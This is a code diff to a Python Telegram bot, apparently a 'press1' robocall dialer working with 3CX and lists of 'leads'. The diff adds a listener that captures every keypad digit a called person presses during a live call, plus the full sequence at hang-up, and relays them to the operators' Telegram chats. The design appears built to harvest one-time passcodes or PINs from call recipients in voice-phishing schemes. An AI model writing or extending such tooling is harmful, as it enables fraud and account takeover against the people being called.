@@ -46,7 +46,9 @@ Commands:
 /testcall — ring test numbers
 /settings — 3CX target & dialer options
 /leads — lead count in session
-/clear — clear loaded numbers"""
+/clear — clear loaded numbers
+
+DTMF: while a call is connected, every key pressed is sent to you here."""
 
 
 @dataclass
@@ -573,6 +575,42 @@ async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
 
+async def _format_dtmf_message(ev: dict[str, str]) -> str | None:
+    kind = ev.get("e", "")
+    lead = ev.get("lead", "").strip() or "unknown"
+    if kind == "digit":
+        return f"DTMF on {lead}\nPressed: {ev.get('d', '')}\nSequence: {ev.get('seq', '')}"
+    if kind == "summary":
+        digits = ev.get("digits", "")
+        if not digits:
+            return None
+        return f"Call ended {lead}\nAll digits: {digits}"
+    return None
+
+
+async def _dtmf_notify_loop(app: Application) -> None:
+    chats = list(ALLOWED)
+    if not chats:
+        return
+    offset = int(app.bot_data.get("dtmf_offset", 0) or 0)
+    while True:
+        try:
+            events, offset = await asyncio.to_thread(vd.fetch_dtmf_events, offset)
+            app.bot_data["dtmf_offset"] = offset
+            for ev in events:
+                text = await _format_dtmf_message(ev)
+                if not text:
+                    continue
+                for chat_id in chats:
+                    try:
+                        await app.bot.send_message(chat_id=chat_id, text=text)
+                    except Exception as e:
+                        print(f"[press1] dtmf send to {chat_id}: {e}")
+        except Exception as e:
+            print(f"[press1] dtmf notify: {e}")
+        await asyncio.sleep(2)
+
+
 async def post_init(app: Application) -> None:
     # Only one process may poll this token (Render OR local — not both).
     await app.bot.delete_webhook(drop_pending_updates=True)
@@ -605,6 +643,13 @@ async def post_init(app: Application) -> None:
         print(f"[press1] dialplan: {dialplan.strip()[:120]}")
     except Exception as e:
         print(f"[press1] press1-ivr dialplan warning: {e}")
+    try:
+        listener = await asyncio.to_thread(vd.ensure_dtmf_listener)
+        print(f"[press1] dtmf listener: {listener.strip()[:120]}")
+    except Exception as e:
+        print(f"[press1] dtmf listener warning: {e}")
+    app.bot_data["dtmf_offset"] = 0
+    asyncio.create_task(_dtmf_notify_loop(app))
 
 
 _conflict_logged = False
